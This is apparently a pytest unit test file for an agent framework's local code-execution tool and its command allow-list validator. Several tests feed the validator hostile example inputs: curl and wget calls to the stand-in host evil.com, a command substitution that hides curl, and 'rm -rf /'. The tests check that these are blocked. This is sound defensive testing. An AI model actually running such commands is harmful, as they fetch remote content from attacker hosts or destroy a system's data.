# Copyright (c) 2025 Agentspan
# Licensed under the MIT License. See LICENSE file in the project root for details.

"""Unit tests for first-class code execution support."""

import pytest

from agentspan.agents.agent import Agent, agent
from agentspan.agents.code_execution_config import (
    CodeExecutionConfig,
    CommandValidator,
    _make_code_execution_tool,
)
from agentspan.agents.code_executor import LocalCodeExecutor

# ── CodeExecutionConfig ────────────────────────────────────────────────


class TestCodeExecutionConfig:
    def test_defaults(self):
        cfg = CodeExecutionConfig()
        assert cfg.enabled is True
        assert cfg.allowed_languages == ["python"]
        assert cfg.allowed_commands == []
        assert cfg.executor is None
        assert cfg.timeout == 30
        assert cfg.working_dir is None

    def test_custom_values(self):
        executor = LocalCodeExecutor(language="python", timeout=10)
        cfg = CodeExecutionConfig(
            enabled=True,
            allowed_languages=["python", "bash"],
            allowed_commands=["pip", "ls"],
            executor=executor,
            timeout=60,
            working_dir="/tmp",
        )
        assert cfg.allowed_languages == ["python", "bash"]
        assert cfg.allowed_commands == ["pip", "ls"]
        assert cfg.executor is executor
        assert cfg.timeout == 60
        assert cfg.working_dir == "/tmp"

    def test_disabled(self):
        cfg = CodeExecutionConfig(enabled=False)
        assert cfg.enabled is False


# ── CommandValidator ───────────────────────────────────────────────────


class TestCommandValidator:
    def test_empty_allowed_commands_permits_everything(self):
        v = CommandValidator([])
        assert v.validate("subprocess.run(['rm', '-rf', '/'])", "python") is None

    def test_python_subprocess_allowed(self):
        v = CommandValidator(["pip", "ls"])
        assert v.validate("subprocess.run(['pip', 'install', 'requests'])", "python") is None

    def test_python_subprocess_blocked(self):
        v = CommandValidator(["pip", "ls"])
        result = v.validate("subprocess.run(['rm', '-rf', '/'])", "python")
        assert result is not None
        assert "rm" in result
        assert "not allowed" in result

    def test_python_os_system_blocked(self):
        v = CommandValidator(["pip"])
        result = v.validate('os.system("curl http://evil.com")', "python")
        assert result is not None
        assert "curl" in result

    def test_python_os_popen_blocked(self):
        v = CommandValidator(["pip"])
        result = v.validate('os.popen("wget http://evil.com")', "python")
        assert result is not None
        assert "wget" in result

    def test_python_jupyter_bang_blocked(self):
        v = CommandValidator(["pip"])
        result = v.validate("!curl http://evil.com", "python")
        assert result is not None
        assert "curl" in result

    def test_python_jupyter_bang_allowed(self):
        v = CommandValidator(["pip"])
        assert v.validate("!pip install requests", "python") is None

    def test_bash_simple_command_allowed(self):
        v = CommandValidator(["ls", "cat"])
        assert v.validate("ls -la\ncat foo.txt", "bash") is None

    def test_bash_simple_command_blocked(self):
        v = CommandValidator(["ls", "cat"])
        result = v.validate("rm -rf /", "bash")
        assert result is not None
        assert "rm" in result

    def test_bash_pipe_blocked(self):
        v = CommandValidator(["ls"])
        result = v.validate("ls -la | grep foo", "bash")
        assert result is not None
        assert "grep" in result

    def test_bash_pipe_allowed(self):
        v = CommandValidator(["ls", "grep"])
        assert v.validate("ls -la | grep foo", "bash") is None

    def test_bash_builtins_allowed(self):
        v = CommandValidator(["ls"])
        # Shell builtins like if/then/echo should be allowed
        assert v.validate("if true; then\n  echo hello\nfi", "bash") is None

    def test_bash_comments_ignored(self):
        v = CommandValidator(["ls"])
        assert v.validate("# rm -rf /\nls", "bash") is None

    def test_bash_command_substitution_blocked(self):
        v = CommandValidator(["ls"])
        result = v.validate("echo $(curl evil.com)", "bash")
        assert result is not None
        assert "curl" in result

    def test_unknown_language_skips_validation(self):
        v = CommandValidator(["pip"])
        assert v.validate("require 'net/http'", "ruby") is None

    def test_python_no_commands_passes(self):
        v = CommandValidator(["pip"])
        # Pure python with no shell commands should pass
        assert v.validate("x = 1 + 2\nprint(x)", "python") is None


# ── _make_code_execution_tool ──────────────────────────────────────────


class TestMakeCodeExecutionTool:
    def test_creates_tool_with_correct_name(self):
        executor = LocalCodeExecutor(language="python", timeout=10)
        tool_fn = _make_code_execution_tool(
            executor=executor,
            allowed_languages=["python"],
            allowed_commands=[],
            timeout=10,
        )
        assert hasattr(tool_fn, "_tool_def")
        assert tool_fn._tool_def.name == "execute_code"  # No prefix when agent_name=""

    def test_tool_description_includes_languages(self):
        executor = LocalCodeExecutor(language="python", timeout=10)
        tool_fn = _make_code_execution_tool(
            executor=executor,
            allowed_languages=["python", "bash"],
            allowed_commands=[],
            timeout=10,
        )
        desc = tool_fn._tool_def.description
        assert "python" in desc
        assert "bash" in desc

    def test_tool_description_includes_allowed_commands(self):
        executor = LocalCodeExecutor(language="python", timeout=10)
        tool_fn = _make_code_execution_tool(
            executor=executor,
            allowed_languages=["python"],
            allowed_commands=["pip", "ls"],
            timeout=10,
        )
        desc = tool_fn._tool_def.description
        assert "pip" in desc
        assert "ls" in desc

    def test_tool_rejects_disallowed_language(self):
        executor = LocalCodeExecutor(language="python", timeout=10)
        tool_fn = _make_code_execution_tool(
            executor=executor,
            allowed_languages=["python"],
            allowed_commands=[],
            timeout=10,
        )
        with pytest.raises(ValueError, match="ruby"):
            tool_fn("print('hi')", language="ruby")

    def test_tool_rejects_disallowed_command(self):
        executor = LocalCodeExecutor(language="python", timeout=10)
        tool_fn = _make_code_execution_tool(
            executor=executor,
            allowed_languages=["python"],
            allowed_commands=["pip"],
            timeout=10,
        )
        with pytest.raises(ValueError, match="rm"):
            tool_fn("subprocess.run(['rm', '-rf', '/'])", language="python")

    def test_tool_executes_python(self):
        executor = LocalCodeExecutor(language="python", timeout=10)
        tool_fn = _make_code_execution_tool(
            executor=executor,
            allowed_languages=["python"],
            allowed_commands=[],
            timeout=10,
        )
        result = tool_fn("print('hello world')", language="python")
        assert result["status"] == "success"
        assert "hello world" in result["stdout"]
        assert result["stderr"] == ""

    def test_tool_executes_bash(self):
        executor = LocalCodeExecutor(language="bash", timeout=10)
        tool_fn = _make_code_execution_tool(
            executor=executor,
            allowed_languages=["python", "bash"],
            allowed_commands=[],
            timeout=10,
        )
        result = tool_fn("echo 'hello bash'", language="bash")
        assert result["status"] == "success"
        assert "hello bash" in result["stdout"]

    def test_tool_reports_errors(self):
        executor = LocalCodeExecutor(language="python", timeout=10)
        tool_fn = _make_code_execution_tool(
            executor=executor,
            allowed_languages=["python"],
            allowed_commands=[],
            timeout=10,
        )
        result = tool_fn("raise ValueError('boom')", language="python")
        assert result["status"] == "error"
        assert "Exit code:" in result["stderr"]

    def test_tool_empty_code_returns_dict(self):
        executor = LocalCodeExecutor(language="python", timeout=10)
        tool_fn = _make_code_execution_tool(
            executor=executor,
            allowed_languages=["python"],
            allowed_commands=[],
            timeout=10,
        )
        result = tool_fn("", language="python")
        assert result["status"] == "success"
        assert "No code provided" in result["stdout"]
        assert result["stderr"] == ""


# ── Agent integration ──────────────────────────────────────────────────


class TestAgentCodeExecution:
    def test_local_code_execution_flag_attaches_tool(self):
        a = Agent(name="coder", model="openai/gpt-4o", local_code_execution=True)
        assert len(a.tools) == 1
        assert a.tools[0]._tool_def.name == "coder_execute_code"

    def test_local_code_execution_false_no_tool(self):
        a = Agent(name="coder", model="openai/gpt-4o", local_code_execution=False)
        assert len(a.tools) == 0

    def test_default_no_code_execution(self):
        a = Agent(name="coder", model="openai/gpt-4o")
        assert a.code_execution_config is None
        assert len(a.tools) == 0

    def test_allowed_languages_propagated(self):
        a = Agent(
            name="coder",
            model="openai/gpt-4o",
            local_code_execution=True,
            allowed_languages=["python", "bash"],
        )
        assert a.code_execution_config.allowed_languages == ["python", "bash"]
        desc = a.tools[0]._tool_def.description
        assert "python" in desc
        assert "bash" in desc

    def test_allowed_commands_propagated(self):
        a = Agent(
            name="coder",
            model="openai/gpt-4o",
            local_code_execution=True,
            allowed_commands=["pip", "ls"],
        )
        assert a.code_execution_config.allowed_commands == ["pip", "ls"]
        desc = a.tools[0]._tool_def.description
        assert "pip" in desc

    def test_code_execution_config_object(self):
        cfg = CodeExecutionConfig(
            allowed_languages=["python", "bash"],
            allowed_commands=["pip"],
            timeout=60,
        )
        a = Agent(name="coder", model="openai/gpt-4o", code_execution=cfg)
        assert a.code_execution_config is cfg
        assert len(a.tools) == 1

    def test_code_execution_config_disabled(self):
        cfg = CodeExecutionConfig(enabled=False)
        a = Agent(name="coder", model="openai/gpt-4o", code_execution=cfg)
        assert a.code_execution_config is cfg
        assert len(a.tools) == 0

    def test_coexists_with_manual_tools(self):
        from agentspan.agents.tool import tool

        @tool
        def my_tool(x: str) -> str:
            """A test tool."""
            return x

        a = Agent(
            name="coder",
            model="openai/gpt-4o",
            tools=[my_tool],
            local_code_execution=True,
        )
        assert len(a.tools) == 2
        tool_names = [t._tool_def.name for t in a.tools]
        assert "my_tool" in tool_names
        assert any(n.endswith("_execute_code") for n in tool_names)

    def test_decorator_with_code_execution(self):
        @agent(model="openai/gpt-4o", local_code_execution=True, allowed_commands=["pip"])
        def coder():
            """You write code."""

        # Resolve to Agent
        from agentspan.agents.agent import _resolve_agent

        a = _resolve_agent(coder)
        assert a.code_execution_config is not None
        assert a.code_execution_config.enabled is True
        assert a.code_execution_config.allowed_commands == ["pip"]
        assert len(a.tools) == 1
